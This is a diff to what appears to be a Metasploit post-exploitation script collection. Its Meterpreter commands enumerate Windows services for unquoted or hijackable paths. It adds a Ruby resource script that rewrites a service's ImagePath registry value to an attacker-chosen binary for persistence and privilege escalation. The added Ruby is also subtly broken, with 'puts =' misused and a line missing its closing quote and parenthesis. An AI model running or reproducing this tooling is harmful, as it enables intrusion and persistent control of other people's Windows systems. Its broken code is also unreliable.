@@ -14,3 +14,15 @@ execute -H -f cmd.exe -a "/c wmic service get name,pathname > c:\\windows\\temp\
 download c:\\windows\\temp\\svc.txt svc.txt
 background
 cat svc.txt|grep -v -i 'System32'
+
+# msf-unqp-persistence.rc 
+#execute -f wmic.exe -H -i -a "service get name,startname,startmode,pathname|findstr /vi system32|findstr LocalSystem"
+<ruby>
+puts = "Enter the service name."
+name = gets
+puts = "Enter the service path with double \ and no quotes."
+path = gets
+run_single("reg queryval -k HKLM\\System\\CurrentControlSet\\Services\\#{name} -v ImagePath") 
+run_single("reg setval -k HKLM\\System\\CurrentControlSet\\Services\\#{name} -v ImagePath -d "#{path}""
+run_single("reg queryval -k HKLM\\System\\CurrentControlSet\\Services\\#{name} -v ImagePath") 
+</ruby>
